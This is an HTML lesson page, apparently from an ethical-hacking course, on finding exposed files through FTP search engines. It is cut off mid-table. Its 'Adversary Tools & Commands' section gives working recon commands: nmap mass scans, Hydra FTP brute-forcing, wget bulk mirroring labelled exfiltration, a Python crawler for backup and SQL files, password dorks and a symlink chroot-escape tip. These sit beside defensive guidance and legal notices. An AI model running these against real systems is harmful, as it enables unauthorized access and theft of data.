@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>FTP Search/Overview &amp; Techniques | ISCSECURITY Master Class Series</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="/css/styles.css?v=2026_PRODUCTION_FINAL" />
+  
+  <!-- MemberSpace -->
+  <script>
+    window.MemberSpace = window.MemberSpace || { subdomain: "iscsecurity" };
+    (function(d){
+      var s = d.createElement("script");
+      s.src = "https://cdn.memberspace.com/scripts/widgets.js";
+      s.async = true;
+      d.head.appendChild(s);
+    })(document);
+  </script>
+  
+</head>
+
+<body class="page-lesson">
+
+<div class="site-topbar" role="note" aria-label="Legal notice">
+  <small class="topbar-note">
+    © 2026 ISCSECURITY · Authorization-first training. All testing must be lawful, scoped, and approved in writing.
+  </small>
+	<nav class="topbar-links" aria-label="Topbar links">
+      <a href="https://iscsecurity.org/index">Home</a>
+      <a href="https://iscsecurity.org/content/index">Content</a>
+	  <a href="https://iscsecurity.org/content/1-ethical-hacking/2-open-source-intelligence/index">OSINT</a>
+      <a href="https://iscsecurity.org/contact">Contact</a>
+    </nav>
+</div>
+
+  <main class="page modules-page no-shift" id="ethical-hacking-training-content" data-ms-content="members-only">
+  <article class="lesson-content overlay" tabindex="0" aria-label="Lesson content: FTP Search/Overview &amp; Techniques">
+
+    <p class="breadcrumb">
+      <a href="https://iscsecurity.org/index">Home</a> →
+        <a href="https://iscsecurity.org/content/index">Content</a> →
+        <a href="https://iscsecurity.org/content/1-ethical-hacking/2-open-source-intelligence/index">OSINT</a> →
+      <span aria-current="page">Page 11</span>
+    </p>
+
+    <h1>FTP Search/Overview &amp; Techniques</h1>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: AUTHORIZED USE BANNERS                               -->
+    <!-- ============================================================ -->
+
+    <div class="reminder-auth">
+      <strong>🚨 AUTHORIZED USE ONLY:</strong>
+      <span>
+        All content in this document is for educational and defensive training purposes only. 
+        The adversarial techniques described are derived from real-world tradecraft but 
+        are documented exclusively for <strong>defensive analysis, detection engineering, 
+        and authorized security testing</strong>. Unauthorized deployment of any technique 
+        described may constitute a criminal offense under applicable national and 
+        international cybercrime laws. Always obtain <strong>explicit written authorization</strong> 
+        from the system owner or authorized legal entity before testing, executing, or 
+        simulating any of the techniques outlined in this document.
+      </span>
+    </div>
+
+    <div class="reminder-comp">
+      <strong>🌍 INTERNATIONAL COMPLIANCE NOTICE:</strong>
+      <span>
+        Cybercrime laws vary significantly by jurisdiction. It is your sole responsibility 
+        to understand and comply with the laws applicable to your location, the location 
+        of any target systems, and your organization's policies. When in doubt, 
+        <strong>consult a qualified legal professional</strong> before testing, executing, 
+        or simulating any technique described in this document.
+      </span>
+    </div>
+	
+	<!-- ============================================================ -->
+    <!-- LAB ENVIRONMENT DISCLAIMER & SETUP GUIDANCE                  -->
+    <!-- ============================================================ -->
+
+    <div class="reminder-lab">
+      <strong>🧪 LAB ENVIRONMENT NOTICE:</strong>
+      <span>
+        All practical examples, command-line executions, and scenario-based exercises in this document are demonstrated within the <strong>ISCSEC internal training laboratory</strong>. 
+        This is a controlled, isolated environment that exists solely for educational and defensive training purposes.
+      </span>
+      <br><br>
+      <span>
+        <strong>You do not have access to the ISCSEC lab.</strong> As a learner, you are expected to build and maintain your own isolated lab environment, 
+        replicating the documented topology, IP schemes, and hostname conventions. The ISCSEC lab serves as a <strong>canonical reference topology</strong> 
+        for this training, not a shared or remotely accessible resource.
+      </span>
+      <br><br>
+      <span>
+        <strong>Lab requirements:</strong>
+        <ul>
+          <li>Isolated virtualised environment (e.g., VMware Workstation, VirtualBox, or Hyper-V)</li>
+          <li>Attacker operator platform (e.g., Kali Linux or equivalent)</li>
+          <li>Target Windows host (e.g., CLIENT01 at 172.16.5.60)</li>
+          <li>Internal network with domain controller (DC01 at 172.16.5.25), SQL server (SQL01 at 172.16.5.20), web server (WEB01 at 172.16.5.30), and application server (APP01 at 172.16.5.40)</li>
+          <li>All testing must be conducted within your own isolated network with <strong>explicit written authorization</strong> for any systems involved</li>
+        </ul>
+      </span>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: WHAT IS FTP SEARCH?                                 -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="ftp-what-is">
+      <h2 id="ftp-what-is">1. What is FTP Search?</h2>
+
+      <p>
+        FTP search is the practice of locating files, directories and indexed content on publicly reachable FTP servers. 
+        These indexes frequently contain installers, backups, documents, or configuration files that were never intended 
+        to be widely discoverable, making them valuable for OSINT, penetration testing, and risk discovery.
+      </p>
+
+      <div class="reminder">
+        <strong>Operational Note:</strong><br>
+        <span>FTP search is one of the oldest forms of OSINT discovery. Despite the age of the protocol, 
+        misconfigured and anonymous FTP servers remain surprisingly common in 2026.</span>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: HOW FTP SEARCH WORKS                                -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="ftp-how-works">
+      <h2 id="ftp-how-works">2. How FTP Search Works</h2>
+
+      <ul>
+        <li>Public FTP servers can be crawled and indexed by specialised FTP search engines and general web search engines.</li>
+        <li>Researchers and attackers use crafted queries (Google dorks) and dedicated search engines to 
+        find exposed archives (zip/rar), documents (pdf/docx), and plaintext files containing credentials.</li>
+        <li>Automation via scripts (Python ftplib), CLI tools, and metadata harvesters speeds discovery and pivoting to related targets.</li>
+      </ul>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: USEFUL FTP SEARCH ENGINES                           -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="ftp-engines">
+      <h2 id="ftp-engines">3. Useful FTP Search Engines &amp; Platforms (current)</h2>
+
+      <ul>
+        <li><strong>NAPALM/SearchFTPS:</strong> Active FTP indexer that aggregates millions of files, which is useful for rapid discovery and download of public FTP-hosted artifacts.</li>
+        <li><strong>Mamont (MMNT):</strong> Long-running, large FTP index that mirrors open FTP indexes and remains widely referenced in OSINT communities.</li>
+        <li>Other aggregators and lists (GlobalFileSearch, FreewareWeb, FileMare and community-maintained directories) remain helpful. Community lists and subreddit threads frequently point to active mirrors.</li>
+      </ul>
+
+      <div class="reminder">
+        <strong>Operator Note:</strong><br>
+        Index freshness (how quickly a search engine discovers, processes, and adds new or updated web content to its database) 
+		varies dramatically between FTP search engines. Cross-reference results across multiple engines for comprehensive coverage.
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: TOOLS & AUTOMATION                                  -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="ftp-tools">
+      <h2 id="ftp-tools">4. Tools &amp; Automation</h2>
+
+      <ul>
+        <li><strong>Metagoofil:</strong> Metadata harvesting tool (bundled in Kali) to extract authors, usernames and paths from public documents (pdf, docx, xls). Use as a pivot to find internal hostnames or user IDs referenced in files.</li>
+        <li>Command-line scripts using <code>ftplib</code>, crawlers, or scraping helpers can enumerate indexes and bulk-download targets for offline analysis.</li>
+        <li>Combine archive search tooling (Wayback/WaybackUrls, GAU/Katana) with FTP indices to find related archived copies or historical exposures.</li>
+      </ul>
+
+      <div class="reminder-lightblue">
+        <strong>Note:</strong><br>
+        Automation accelerates discovery but also increases the risk of triggering alerts. Use rate-limiting and 
+		respect engagement scope.
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: ADVERSARIAL TRADECRAFT                               -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="adversarial-ftp-tradecraft">
+      <h2 id="adversarial-ftp-tradecraft">5. Adversarial Tradecraft: How Threat Actors Weaponize FTP Search</h2>
+
+      <p>
+        Understanding how real-world adversaries abuse FTP search is 
+        <strong>essential for defensive operations and authorized Red Team engagements</strong>. 
+        Threat actors frequently target FTP services because they are often legacy systems, 
+        poorly monitored, and misconfigured with anonymous access enabled. <br>For adversaries, 
+        FTP represents a <strong>low-noise avenue for reconnaissance, staging, and exfiltration</strong>.
+      </p>
+
+      <h3>a) Adversarial Mindset &amp; Target Selection</h3>
+
+      <p>
+        Unlike scoped penetration tests, adversaries prioritize accessibility and anonymity. 
+        Their FTP tradecraft focuses on:
+      </p>
+
+      <ul>
+        <li>
+          <strong>Mass discovery of anonymous endpoints:</strong> Scanning wide IP ranges for 
+          FTP servers accepting anonymous or weak credentials to establish staging grounds.
+        </li>
+        <li>
+          <strong>Metadata harvesting for spear-phishing:</strong> Bulk-downloading documents 
+          from open FTP indexes to extract author names, software versions, and internal paths.
+        </li>
+        <li>
+          <strong>Exploitation of FTP bounce:</strong> Abusing misconfigured servers to proxy 
+          connections into internal networks or obfuscate attack origin.
+        </li>
+      </ul>
+
+      <div class="info-remember">
+        <strong>Defensive Translation:</strong><br>
+        <span>By studying adversarial FTP patterns, defenders can prioritize patching or 
+        decommissioning anonymous FTP, implement SIEM alerting on anomalous directory listings, 
+        and deploy decoy files for tripwire detection.</span>
+      </div>
+
+      <h3>b) Real-World Adversarial Examples</h3>
+
+      <p>
+        The following examples are derived from public incident reports and threat 
+        intelligence disclosures:
+      </p>
+
+      <ul>
+        <li>
+          <strong>Malware Distribution Hubs:</strong> Threat actors scanned for anonymous 
+          writable FTP directories and staged trojanized installers (<code>.zip</code>, <code>.exe</code>) 
+          alongside legitimate software. Victims downloading from public FTP indexes inadvertently 
+          executed payloads.
+        </li>
+        <li>
+          <strong>Credential Harvesting from Metadata:</strong> An adversary used Metagoofil-style 
+          extraction on documents harvested from an exposed FTP server to recover internal usernames, 
+          printer paths, and Active Directory naming conventions later used in password-spray campaigns.
+        </li>
+        <li>
+          <strong>Initial Access via Anonymous Uploads:</strong> A ransomware affiliate identified 
+          a manufacturing partner with anonymous FTP write access, uploaded a web shell disguised 
+          as a backup archive, and pivoted into the corporate network days later.
+        </li>
+        <li>
+          <strong>Supply Chain Poisoning:</strong> Attackers replaced legitimate firmware files 
+          in a vendor's public FTP repository with backdoored versions. The files were indexed 
+          by search engines and downloaded by unsuspecting integrators.
+        </li>
+      </ul>
+
+      <h3>c) Adversary Tools &amp; Commands</h3>
+
+<p>
+  Adversaries chain open-source scanning tools, scripting libraries, and standard Unix 
+  utilities into automated FTP exploitation pipelines.
+</p>
+
+<p>
+<strong>Phase 1: Build the target list properly</strong>
+</p>
+
+<pre><code class="language-bash"># 1. ASN -> CIDR (append directly to main file)
+#    Note: Use organization name, not domain, depending on your tool.
+asnlookup -o "Target Inc" 2>/dev/null >> target_ranges.txt
+
+# 2. Resolve apex domain(s)
+echo "target.com" | dnsx -a -resp-only -silent >> target_ranges.txt
+
+# 3. Historical subdomains from certificate transparency
+#    Strip '*.'' wildcards before resolving
+curl -s "https://crt.sh/?q=%.target.com&output=json" | \
+  jq -r '.[].name_value' | \
+  sed 's/^\*\.//' | sort -u | \
+  dnsx -a -resp-only -silent >> target_ranges.txt
+
+# 4. Deduplicate and sort (handles both CIDR and individual IPs)
+sort -uV target_ranges.txt -o target_ranges.txt
+</code></pre>
+
+<p>
+<strong>Phase 2: Mass FTP discovery with actual banner grabbing</strong>
+</p>
+
+<pre><code class="language-bash">nmap -p 21 --open -iL target_ranges.txt \
+  -sV \
+  --script banner,ftp-anon,ftp-bounce,ftp-syst,ftp-vuln-cve2010-4221 \
+  --min-rate 1000 \
+  --max-retries 2 \
+  -oA ftp_mass_scan</code></pre>
+
+<p><strong>Key additions explained:</strong></p>
+
+<div class="iscsec-table-responsive">
+  <table class="iscsec-table" aria-label="Nmap flags explained">
+    <thead>
+      <tr>
+        <th>Flag / Script</th>
+        <th>Purpose</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>-sV</code></td>
+        <td>Performs service/version detection; captures the FTP 220 banner.</td>
+      </tr>
+      <tr>
+        <td><code>banner</code></td>
+        <td>Generic NSE script to explicitly pull banners from any open port.</td>
+      </tr>
+      <tr>
+        <td><code>--min-rate 1000</code></td>
+        <td>Keeps the scan fast across a large <code>-iL</code> list.</td>
+      </tr>
+      <tr>
+        <td><code>--max-retries 2</code></td>
+        <td>Reduces retry overhead on firewalled hosts.</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<p>
+<strong>Phase 3: Anonymous access validation and directory listing</strong>
+</p>
+
+<pre><code class="language-bash"># Greppable extract of anonymous-ready hosts from Nmap XML
+grep -E "Anonymous FTP login allowed" ftp_mass_scan.nmap | awk '{print $NF}' > ftp_anon_hosts.txt
+
+# Automated directory listing via lftp (non-interactive)
+while read host; do
+  echo "[*] Listing ${host}"
+  lftp -u anonymous,anonymous -e "set ssl:verify-certificate no; ls -R; bye" "${host}" 2>/dev/null
+done &lt; ftp_anon_hosts.txt &gt; ftp_anon_listings.txt
+</code></pre>
+
+<p>
+<strong>Expected output from Phase 3:</strong>
+</p>
+
+<pre><code class="language-text">[*] Listing 203.0.113.45
+drwxr-xr-x    2 ftp      ftp          4096 Jan 15  2023 incoming
+-rw-r--r--    1 ftp      ftp         14220 Jan 15  2023 config_backup.tar.gz
+</code></pre>
+
+<div class="reminder">
+  <strong>Operator Note:</strong>
+  <ul>
+    <li>Merge <code>asn_ranges.txt</code> into <code>target_ranges.txt</code> (or write directly to it).</li>
+    <li>Strip <code>*.</code> wildcards from certificate transparency output before DNS resolution.</li>
+    <li>Add <code>-sV</code> (and optionally <code>banner</code>) to the Nmap command for true banner grabbing.</li>
+    <li>Pass an organization name, not a domain, to <code>asnlookup</code> unless your specific fork supports domain lookups.</li>
+    <li>Add timing options (<code>--min-rate</code>, <code>--max-retries</code>) when scanning large IP lists to avoid hours-long scans.</li>
+  </ul>
+</div>
+
+<p>
+<strong>Anonymous access validation and directory listing across all discovered hosts:</strong>
+</p>
+
+<pre><code class="language-bash"># Iterate over hosts confirmed to have port 21 open and anonymous allowed
+while read host; do
+  echo "[*] Checking anonymous access on ${host}"
+  ftp -n -v "${host}" &lt;&lt; EOF
+user anonymous anonymous@
+passive
+ls -R
+bye
+EOF
+done &lt; ftp_anon_hosts.txt
+</code></pre>
+
+<p>
+<strong>Automated brute-force and file exfiltration:</strong>
+</p>
+
+<pre><code class="language-bash"># Extract live FTP targets from previous mass scan
+grep "21/tcp open" ftp_mass_scan.gnmap | \
+  awk '{print $2}' > ftp_hosts.txt
+
+# Hydra FTP brute-force against discovered hosts
+hydra -L users.txt -P passwords.txt -M ftp_hosts.txt ftp -t 6 -o hydra_ftp_cracked.txt
+
+# Mirror with passive mode (default) for reliability through NAT
+wget --mirror --ftp-user=anonymous --ftp-password=anon@ \
+  ftp://ftp.target.com/public/ -P /tmp/staging_area
+
+# Only use --no-passive-ftp if actively exploiting an FTP bounce or
+# forcing the server to establish a data connection to a third host.
+</code></pre>
+
+<p>
+<strong>Python ftplib reconnaissance and bulk download:</strong>
+</p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+from ftplib import FTP
+import fnmatch
+
+TARGETS = ['ftp.target.com']
+KEYWORDS = ('.zip', '.sql', '.backup', '.tar.gz', '.pdf')
+
+def crawl(ftp, path=""):
+    try:
+        files = ftp.mlsd(path)  # Modern alternative to nlst(); gives metadata
+    except Exception:
+        files = ((f, {}) for f in ftp.nlst(path))  # Fallback for legacy servers
+    
+    for name, meta in files:
+        full = f"{path}/{name}" if path else name
+        if meta.get("type") == "dir":
+            crawl(ftp, full)
+        elif any(name.endswith(k) for k in KEYWORDS):
+            try:
+                size = ftp.size(full)
+                print(f"  [!] HIT: {full} ({size} bytes)")
+                # Exfiltration line commented out for safety
+                # ftp.retrbinary(f'RETR {full}', open(name.replace('/','_'),'wb').write)
+            except Exception as e:
+                print(f"  [-] ERR: {full} | {e}")
+
+for host in TARGETS:
+    try:
+        with FTP(host, timeout=10) as ftp:
+            ftp.login('anonymous', 'anonymous@domain.com')
+            print(f"[+] Connected: {host}")
+            crawl(ftp)
+    except Exception as e:
+        print(f"[-] {host} error: {e}")
+</code></pre>
+
+<p>
+<strong>Google Dorking for exposed FTP directories:</strong>
+</p>
+
+<p>
+  Beyond the IP ranges already enumerated, exposed FTP directories can be discovered 
+  via search-engine indexing:
+</p>
+
+<pre><code class="language-bash">inurl:"ftp://" intitle:"index of" "parent directory" "last modified"
+intitle:"index of" inurl:ftp (zip|rar|sql|db|backup|tar.gz) site:target.com
+inurl:ftp intitle:"index of" "config" | "password" | "secret"
+</code></pre>
+
+<div class="reminder-lightblue">
+  <strong>Note:</strong><br>
+  <span>The commands above are provided for <strong>defensive analysis and detection 
+  engineering</strong>. Understanding adversary tooling helps Blue Teams write detection 
+  rules for FTP anomaly alerts, unauthorized anonymous logins, and bulk-retrieval behaviors.</span>
+</div>
+
+<h3>d) Adversary OPSEC &amp; Evasion Techniques</h3>
+
+<p>
+  Sophisticated threat actors apply operational security to FTP-based operations 
+  to avoid attribution and detection:
+</p>
+
+<ul>
+  <li>
+    <strong>Anonymous access abuse:</strong> Using generic <code>anonymous</code> or 
+    <code>ftp</code> credentials to avoid creating traceable user accounts.
+  </li>
+  <li>
+    <strong>FTP bounce / active-mode exploitation:</strong> Leveraging legacy servers 
+    that support <code>PORT</code> commands to proxy scans or transfers through the 
+    victim's infrastructure, masking true origin.
+  </li>
+  <li>
+    <strong>Symlink traversal on misconfigured daemons:</strong> Following existing 
+    symlinks or, if writable, creating symlinks to escape chroot jails (e.g., 
+    <code>ln -s /etc/passwd</code> then retrieving via <code>RETR</code>).
+  </li>
+  <li>
+    <strong>Compromised intermediary hosts:</strong> Routing FTP connections through 
+    previously compromised residential or edge systems to avoid direct attribution.
+  </li>
+  <li>
+    <strong>Temporal dispersion:</strong> Performing reconnaissance and downloads 
+    during business hours to blend with legitimate administrative traffic.
+  </li>
+</ul>
+
+<div class="info-remember">
+  <strong>Blue Team Note:</strong><br>
+  FTP logs often record little more than IP, timestamp, and bytes transferred. 
+  To detect adversarial use, correlate FTP session volumes with endpoint detection, 
+  monitor for off-hours bulk downloads, and baseline expected anonymous access 
+  (if enabled at all).
+</div>
+
+<h3>e) Defensive Countermeasures &amp; Detection</h3>
+
+<p>
+  Translating adversarial FTP tradecraft into defense requires both 
+  <strong>attack-surface reduction</strong> and <strong>behavioral monitoring</strong>:
+</p>
+
+<ul>
+  <li>
+    <strong>Disable anonymous FTP:</strong> Eliminate unauthenticated access entirely; 
+    require modern authentication or decommission FTP in favor of SFTP/FTPS.
+  </li>
+  <li>
+    <strong>Monitor for directory traversal:</strong> Alert on FTP commands that 
+    attempt symlink following or escape from chroot jails.
+  </li>
+  <li>
+    <strong>Detect brute-force patterns:</strong> Use SIEM rules to flag rapid 
+    sequential login failures or unusual username enumeration against FTP services.
+  </li>
+  <li>
+    <strong>Honeypot files:</strong> Seed known public FTP indexes with canary 
+    documents containing tracking metadata; trigger alerts when opened or processed.
+  </li>
+  <li>
+    <strong>Shodan/Censys monitoring:</strong> Continuously monitor organizational 
+    IP ranges for unexpected port 21 exposure or changes in FTP banners.
+  </li>
+</ul>
+
+<div class="info-remember" style="margin: 15px 0;">
+  <strong>Adversarial Insight:</strong>
+  <span style="display: block; margin-top: 5px;">
+    The tools used to defend FTP infrastructure are often identical to those used to 
+    attack it; Nmap, Hydra, Python ftplib, and wget. The critical distinction is 
+    <strong>authorization and intent</strong>. Defenders who understand adversarial 
+    FTP tradecraft can identify misconfigurations before they are exploited, detect 
+    anomalous usage patterns, and justify replacing legacy FTP with secure alternatives.
+  </span>
+</div>
+</section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: LEGAL, ETHICAL & OPSEC NOTES                        -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="ftp-legal">
+      <h2 id="ftp-legal">6. Legal, Ethical &amp; OPSEC Notes</h2>
+
+      <ul>
+        <li>Accessing truly public, unauthenticated files is generally legal, but using exposed credentials or bypassing protections without explicit written permission is not. Confirm rules of engagement first.</li>
+        <li>Document everything; URLs, timestamps, and how the file was discovered. This makes reporting reproducible and defensible.</li>
+        <li>When you find sensitive information, follow responsible disclosure and the client's data-handling policy. Do not publish leaked or private data.</li>
+      </ul>
+
+      <div class="reminder-opsec">
+        <strong>OPSEC Principle:</strong><br>
+        <span>The line between public FTP discovery and unauthorized access is thin. If a directory requires any form of 
+		authentication beyond anonymous, stop and verify authorization.</span>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: RAPID CHECKLIST FOR FTP OSINT                       -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="ftp-checklist">
+      <h2 id="ftp-checklist">7. Rapid Checklist for FTP OSINT</h2>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="FTP OSINT rapid checklist">
+          <thead>
+            <tr>
+              <th>Step</th>
+              <th>Action</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>1</td>
+              <td>Run targeted dorks and search FTP indices (SearchFTPS, Mamont).</td>
+            </tr>
+            <tr>
+              <td>2</td>
+              <td>Use Metagoofil/metadata tools on discovered docs to extract usernames/paths.</td>
+            </tr>
+            <tr>
+              <td>3</td>
+              <td>Cross-check URLs in WayBack and archive tools for historical data.</td>
+            </tr>
+            <tr>
+              <td>4</td>
+              <td>Log findings, verify in-scope status, and follow disclosure rules.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: SUPPORTING RESOURCES                                -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="ftp-resources">
+      <h2 id="ftp-resources">8. Supporting Resources &amp; Recommended Reading</h2>
+
+      <p class="resource-note" style="color: #aaa; font-size: 0.95rem;">
+        Curated references for safe OSINT practice, FTP enumeration, metadata analysis,
+        and responsible discovery workflows. These resources reinforce the techniques
+        presented in this section. 
+      </p>
+
+      <ul>
+        <li>
+          <a href="https://www.rfc-editor.org/rfc/rfc959" target="_blank" rel="noopener">
+            RFC 959: File Transfer Protocol (FTP)
+          </a>
+          <small class="resource-path" style="display: block; color: #888; font-size: 0.85rem;">Path: Official specification for FTP commands, responses, and protocol behaviour.</small>
+        </li>
+        <li>
+          <a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noopener">
+            OWASP WSTG: Testing for FTP Services
+          </a>
+          <small class="resource-path" style="display: block; color: #888; font-size: 0.85rem;">Path: FTP enumeration steps, misconfiguration checks, and security considerations.</small>
+        </li>
+        <li>
+          <a href="https://archive.org/web/" target="_blank" rel="noopener">
+            Internet Archive: Wayback Machine
+          </a>
+          <small class="resource-path" style="display: block; color: #888; font-size: 0.85rem;">Path: Recover archived FTP directory structures and historical file exposures.</small>
+        </li>
+        <li>
+          <a href="https://www.shodan.io/search?query=port%3A21" target="_blank" rel="noopener">
+            Shodan: FTP Exposure Search
+          </a>
+          <small class="resource-path" style="display: block; color: #888; font-size: 0.85rem;">Path: Identify publicly accessible FTP servers and banners leaking version or host data.</small>
+        </li>
+        <li>
+          <a href="https://github.com/laramies/metagoofil" target="_blank" rel="noopener">
+            Metagoofil: Metadata Extraction Tool
+          </a>
+          <small class="resource-path" style="display: block; color: #888; font-size: 0.85rem;">Path: Extract metadata from discovered documents to pivot to usernames, paths, and hosts.</small>
+        </li>
+        <li>
+          <a href="https://www.searchftps.net/" target="_blank" rel="noopener">
+            SearchFTPs: Indexed FTP Search Engine
+          </a>
+          <small class="resource-path" style="display: block; color: #888; font-size: 0.85rem;">Path: Discover exposed FTP files, archives, and public repositories.</small>
+        </li>
+        <li>
+          <a href="https://www.cisa.gov/resources-tools/resources/tlp" target="_blank" rel="noopener">
+            CISA: Traffic Light Protocol (TLP)
+          </a>
+          <small class="resource-path" style="display: block; color: #888; font-size: 0.85rem;">Path: Framework for handling sensitive data discovered during OSINT collection.</small>
+        </li>
+      </ul>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: CHAPTER SUMMARY                                     -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="ftp-chapter-summary">
+      <h2 id="ftp-chapter-summary">9. Chapter Summary</h2>
+
+      <p>
+        By completing this chapter you should now be able to:
+      </p>
+
+      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; margin: 20px 0;">
+
+        <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+          <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+          <span><strong>Understand what FTP search is and why it matters.</strong><br>
+          <span style="color: #aaa; font-size: 0.9rem;">Locating exposed files, archives, and configuration remnants.</span></span>
+        </div>
+
+        <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+          <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+          <span><strong>Use FTP search engines effectively.</strong><br>
+          <span style="color: #aaa; font-size: 0.9rem;">SearchFTPS, Mamont, and community-maintained indexes.</span></span>
+        </div>
+
+        <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+          <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+          <span><strong>Apply automation and metadata extraction tools.</strong><br>
+          <span style="color: #aaa; font-size: 0.9rem;">Metagoofil, Python ftplib, and archive discovery tools.</span></span>
+        </div>
+
+        <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+          <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+          <span><strong>Understand adversary FTP tradecraft.</strong><br>
+          <span style="color: #aaa; font-size: 0.9rem;">How threat actors discover, exploit, and abuse FTP services.</span></span>
+        </div>
+
+        <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+          <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+          <span><strong>Apply defensive countermeasures for FTP.</strong><br>
+          <span style="color: #aaa; font-size: 0.9rem;">Disable anonymous access, SIEM monitoring, and honeypot deployment.</span></span>
+        </div>
+
+        <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+          <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+          <span><strong>Follow legal and ethical FTP OSINT practices.</strong><br>
+          <span style="color: #aaa; font-size: 0.9rem;">Authorization, documentation, and responsible disclosure.</span></span>
+        </div>
+
+      </div>
+
+      <div class="info-remember" style="margin: 15px 0;">
+        <strong>Why This Matters:</strong>
+        <span style="display: block; margin-top: 5px;">
+          FTP servers are often overlooked in modern security assessments, yet they remain a persistent 
+          source of sensitive data exposure. By mastering FTP search techniques, operators can uncover 
+          forgotten backups, configuration files, and internal documentation that would otherwise remain 
+          hidden. For defenders, understanding adversarial FTP tradecraft is essential for securing legacy 
+          infrastructure and detecting reconnaissance before it escalates to exploitation.
+        </span>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: KEY TAKEAWAYS                                       -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="ftp-takeaways">
+      <h2 id="ftp-takeaways">10. Key Takeaways</h2>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="FTP search key takeaways">
+          <thead>
+            <tr>
+              <th>Concept</th>
+              <th>Why It Matters</th>
+              <th>Security Impact</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>FTP Remains a Persistent Exposure Vector</strong></td>
+              <td>Despite being a legacy protocol, anonymous FTP and misconfigured servers remain common and often contain sensitive data.</td>
+              <td>Regularly audit FTP exposure; decommission or secure anonymous access where possible.</td>
+            </tr>
+            <tr>
+              <td><strong>Search Engines Index FTP Content</strong></td>
+              <td>FTP indexes are crawled by both specialized FTP search engines and general web search engines.</td>
+              <td>Proactively search for your own exposed FTP content using the same dorks an adversary would use.</td>
+            </tr>
+            <tr>
+              <td><strong>Metadata Extraction Is a Force Multiplier</strong></td>
+              <td>Documents harvested from FTP servers reveal internal usernames, paths, and software versions.</td>
+              <td>Metadata provides actionable intelligence for phishing, credential attacks, and infrastructure mapping.</td>
+            </tr>
+            <tr>
+              <td><strong>Adversaries Use FTP for Staging and Exfiltration</strong></td>
+              <td>Anonymous writable FTP directories are frequently used as malware staging grounds or data exfiltration points.</td>
+              <td>Monitor outbound FTP traffic and unusual uploads to detect adversarial activity.</td>
+            </tr>
+            <tr>
+              <td><strong>FTP Bounce Can Mask Origin</strong></td>
+              <td>Misconfigured servers supporting PORT commands can be used to proxy attacks through legitimate infrastructure.</td>
+              <td>Disable FTP bounce features and monitor for anomalous PORT command usage.</td>
+            </tr>
+            <tr>
+              <td><strong>Document Everything</strong></td>
+              <td>Search results change quickly; reproducible queries are essential for reporting and retests.</td>
+              <td>Auditability supports legal defensibility and peer review.</td>
+            </tr>
+            <tr>
+              <td><strong>Automation Requires Responsible Use</strong></td>
+              <td>Scripts accelerate discovery but also increase detection risk and scope creep.</td>
+              <td>Apply rate-limiting, respect robots.txt, and stay within engagement authorization.</td>
+            </tr>
+            <tr>
+              <td><strong>FTP Logs Are Low-Fidelity</strong></td>
+              <td>FTP logs often lack detailed user context, making detection challenging.</td>
+              <td>Correlate FTP activity with other telemetry sources (EDR, DNS logs) for effective detection.</td>
+            </tr>
+            <tr>
+              <td><strong>Honeypot Files Enable Detection</strong></td>
+              <td>Seeding decoy files in public FTP directories allows defenders to detect when adversaries are harvesting.</td>
+              <td>Trigger alerts on access to honeypot files to identify active reconnaissance.</td>
